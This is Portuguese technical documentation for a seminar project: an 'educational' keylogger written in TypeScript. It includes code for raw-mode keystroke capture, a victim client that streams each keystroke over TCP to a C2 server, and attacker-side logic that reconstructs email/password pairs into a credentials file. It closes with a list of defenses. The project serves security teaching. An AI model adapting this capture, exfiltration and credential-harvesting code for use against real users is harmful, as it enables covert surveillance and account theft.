# Keylogger Educacional — Documentação Técnica

> **Contexto:** Projeto para o Seminário de Segurança Computacional — Capítulo 6 "Software Malicioso" de *Computer Security: Principles and Practice*, 4ª ed. (Stallings & Brown).
>
> **Aviso legal:** Uso exclusivamente didático e autorizado. Capturar teclas de terceiros sem consentimento é crime (Brasil: Lei 12.737/2012 — "Lei Carolina Dieckmann" — e LGPD).

---

## 1. O que é um Keylogger

Um **keylogger** é uma categoria de *spyware* — subclasse de malware que coleta informações da vítima sem seu conhecimento. Sua função principal é registrar as teclas digitadas para capturar credenciais, mensagens e dados sensíveis.

Segundo Stallings & Brown (Cap. 6), spyware se encaixa na taxonomia de malware da seguinte forma:

```
Malware
└── Spyware
    ├── Keylogger        ← este projeto
    ├── Adware
    └── Stalkerware
```

Existem três famílias de keyloggers reais:

| Tipo | Mecanismo | Privilégio necessário |
|---|---|---|
| **Software (user-space)** | API hooks do SO (`SetWindowsHookEx`, `/dev/input`) | Usuário comum |
| **Kernel / driver** | Driver de teclado personalizado | Root / SYSTEM |
| **Hardware** | Dispositivo USB entre teclado e PC | Acesso físico |

Este protótipo é da primeira família, restrito ao próprio terminal.

---

## 2. Arquitetura do Projeto

O projeto possui **dois modos de operação**:

### Modo 1 — Log local (`npm run dev`)

```
stdin (raw mode)
     │  Buffer de bytes
     ▼
 keyParser.ts  ──── tecla interpretada ────▶  sessionRecorder.ts
                                                      │
                                               logs/session-*.json
```

### Modo 2 — C2 em rede (`npm run victim` + `npm run attacker`)

```
[Vítima]                              [Atacante / C2 Server]
  stdin (raw mode)                       TCP :4444
       │  Buffer de bytes                    │
       ▼                                     ▼
  keyParser.ts                         attacker.ts (server)
       │  { type: "key", event }            │
       └──── TCP socket (JSON-lines) ───────┘
                                            │
                                     logs/credentials.json
```

---

## 3. Conceitos Técnicos

### 3.1 Terminal em Raw Mode

Por padrão, o terminal opera em *cooked mode*: o SO acumula caracteres, trata Backspace e só entrega a linha completa ao processo quando o usuário pressiona Enter.

Em **raw mode**, cada byte é entregue imediatamente ao processo — sem buffering, sem processamento pelo SO.

```typescript
// src/index.ts  (e src/victim.ts)
if (typeof stdin.setRawMode === "function") {
  stdin.setRawMode(true);   // desliga o line-buffering do terminal
}
stdin.resume();             // inicia o fluxo de dados

stdin.on("data", (data: Buffer) => {
  // chamado para CADA tecla pressionada
  const { key, category } = parseKey(data);
  // ...
});
```

Isso é o que permite interceptar cada tecla individualmente, antes que o editor de linha do SO as processe.

### 3.2 Interpretação de Bytes — `keyParser.ts`

O stdin em raw mode entrega `Buffer`s com os bytes brutos da tecla. A decodificação funciona em três camadas:

**Camada 1 — Sequências de escape ANSI** (teclas especiais):
```typescript
// src/keyParser.ts
const ESCAPE_SEQUENCES: Record<string, string> = {
  "[A": "ArrowUp",
  "[B": "ArrowDown",
  "[C": "ArrowRight",
  "[D": "ArrowLeft",
  "[3~": "Delete",
  // ...
};

if (str.length > 1 && str.charCodeAt(0) === 0x1b) {  // começa com ESC (0x1b)
  const mapped = ESCAPE_SEQUENCES[str.slice(1)];      // ex.: ESC + "[A" → ArrowUp
  // ...
}
```

**Camada 2 — Teclas de controle** (bytes únicos com significado especial):
```typescript
const CONTROL_KEYS: Record<number, string> = {
  0x03: "Ctrl+C",
  0x08: "Backspace",
  0x0d: "Enter",
  0x09: "Tab",
  // ...
};
```

**Camada 3 — Caracteres imprimíveis** (ASCII 0x20–0x7e e Unicode):
```typescript
if (byte >= 0x20 && byte <= 0x7e) {
  return { key: str, category: "char" };
}
```

### 3.3 Persistência — `sessionRecorder.ts`

Todo evento é armazenado com metadados de tempo e ambiente, produzindo um log estruturado em JSON:

```typescript
// src/sessionRecorder.ts
record(event: Omit<KeyEvent, "timestamp" | "elapsedMs">): void {
  const now = Date.now();
  this.session.events.push({
    ...event,
    timestamp: new Date(now).toISOString(),
    elapsedMs: now - this.startMs,  // tempo desde o início da sessão
  });
}
```

Saída gerada (`logs/session-<timestamp>.json`):
```json
{
  "sessionId": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "startedAt": "2026-06-12T18:00:00.000Z",
  "endedAt":   "2026-06-12T18:00:15.321Z",
  "environment": {
    "platform": "win32",
    "nodeVersion": "v20.11.0",
    "hostname": "PC-DEMO"
  },
  "totalEvents": 4,
  "events": [
    { "timestamp": "...", "elapsedMs": 800,  "key": "s",     "raw": "73",    "category": "char"    },
    { "timestamp": "...", "elapsedMs": 1100, "key": "e",     "raw": "65",    "category": "char"    },
    { "timestamp": "...", "elapsedMs": 1900, "key": "Enter", "raw": "0d",    "category": "control" },
    { "timestamp": "...", "elapsedMs": 2400, "key": "Tab",   "raw": "09",    "category": "control" }
  ]
}
```

### 3.4 Protocolo C2 (Command & Control) — `protocol.ts`

O componente de rede simula a arquitetura C2, comum em malware real. O protocolo usa **JSON-lines sobre TCP**: cada mensagem é um objeto JSON seguido de `\n`.

```typescript
// src/protocol.ts
export type C2Message =
  | { type: "handshake"; victim: VictimInfo }  // identificação inicial
  | { type: "key";       event: KeyEvent }     // evento de tecla em tempo real
  | { type: "disconnect" };                    // encerramento limpo
```

**Vítima envia handshake ao conectar:**
```typescript
// src/victim.ts
const socket = createConnection({ host: DEFAULT_HOST, port: DEFAULT_PORT }, () => {
  socket.write(JSON.stringify({
    type: "handshake",
    victim: { sessionId, platform: platform(), nodeVersion: process.version, hostname: hostname() },
  }) + "\n");
});
```

**Cada tecla é exfiltrada em tempo real:**
```typescript
// src/victim.ts
stdin.on("data", (data: Buffer) => {
  const { key, category } = parseKey(data);

  socket.write(JSON.stringify({
    type: "key",
    event: { timestamp: new Date().toISOString(), elapsedMs: 0, key, raw: toHex(data), category },
  }) + "\n");
});
```

### 3.5 Extração de Credenciais — `attacker.ts`

O servidor C2 reconstrói palavras a partir dos eventos de tecla e aplica heurística para identificar pares email/senha:

```typescript
// src/attacker.ts — regex para extrair email de uma string com possível lixo
const EMAIL_EXTRACT = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/;

function flushWord(w: string) {
  const match = EMAIL_EXTRACT.exec(w);

  if (match) {
    pendingEmail = match[0];          // guarda o email
  } else if (pendingEmail) {
    // próxima palavra após um email → senha
    saveCredential({ email: pendingEmail, password: w, ... });
    pendingEmail = null;
  }
}
```

As credenciais extraídas são salvas em `logs/credentials.json`:
```json
[
  {
    "email": "usuario@exemplo.com",
    "password": "senha123",
    "timestamp": "2026-06-12T18:00:30.000Z",
    "hostname": "PC-VITIMA"
  }
]
```

---

## 4. Tipos e Estrutura de Dados

```typescript
// src/types.ts
type KeyCategory = "char" | "control" | "special" | "unknown";

interface KeyEvent {
  timestamp: string;   // ISO-8601
  elapsedMs: number;   // ms desde o início da sessão
  key: string;         // representação legível ("a", "Enter", "ArrowUp")
  raw: string;         // bytes em hex ("0d", "1b 5b 41")
  category: KeyCategory;
}

interface CaptureSession {
  sessionId: string;   // UUID v4
  startedAt: string;
  endedAt: string | null;
  environment: { platform: string; nodeVersion: string; hostname: string };
  totalEvents: number;
  events: KeyEvent[];
}
```

---

## 5. Fluxo de Execução

### Modo local

```
main()
  │
  ├── resolveOutputPath()       → "logs/session-2026-06-12T...json"
  ├── new SessionRecorder()     → gera sessionId (UUID) e startedAt
  ├── stdin.setRawMode(true)    → habilita raw mode
  │
  └── stdin.on("data") loop
        │
        ├── parseKey(buffer)   → { key: "a", category: "char" }
        ├── recorder.record()  → push evento com timestamp
        └── [Ctrl+C] → shutdown()
                          ├── recorder.save(path)  → escrita JSON
                          └── process.exit()
```

### Modo C2

```
[npm run attacker]              [npm run victim]
  server.listen(:4444)    ←──── socket.connect(:4444)
         │                              │
         │ ← handshake ────────────────┘
         │
         │ ← { type:"key", event } (a cada tecla)
         │
    flushWord() → detecta email/senha
    saveCredential() → credentials.json
```

---

## 6. Mapa de Arquivos

| Arquivo | Responsabilidade |
|---|---|
| [src/index.ts](src/index.ts) | Ponto de entrada do modo local; orquestra raw mode e gravação |
| [src/keyParser.ts](src/keyParser.ts) | Decodifica bytes brutos do stdin em teclas legíveis |
| [src/sessionRecorder.ts](src/sessionRecorder.ts) | Acumula eventos e serializa a sessão em JSON |
| [src/types.ts](src/types.ts) | Tipos compartilhados: `KeyEvent`, `CaptureSession` |
| [src/victim.ts](src/victim.ts) | Cliente C2: captura teclas e exfiltra via TCP |
| [src/attacker.ts](src/attacker.ts) | Servidor C2: recebe eventos, reconstrói palavras, extrai credenciais |
| [src/protocol.ts](src/protocol.ts) | Definição do protocolo de mensagens JSON-lines |

---

## 7. Como Executar

```bash
npm install

# Modo 1 — log local
npm run dev

# Modo 2 — C2 (dois terminais separados)
npm run attacker   # terminal 1: inicia o servidor na porta 4444
npm run victim     # terminal 2: conecta e começa a capturar
```

Pressione **Ctrl+C** para encerrar qualquer modo.

---

## 8. Defesas

| Defesa | Como mitiga |
|---|---|
| **Teclado virtual (on-screen keyboard)** | Não gera eventos de teclado físico |
| **Autenticação multifator (MFA)** | Senha capturada sozinha não basta |
| **Antimalware comportamental** | Detecta raw mode / hooks de teclado suspeitos |
| **Princípio do menor privilégio** | Limita o que um processo malicioso pode acessar |
| **Monitoramento de rede** | Conexões TCP anômalas (ex.: porta 4444) são rastreáveis |
| **Gerenciador de senhas + autofill** | Senha nunca é digitada manualmente |
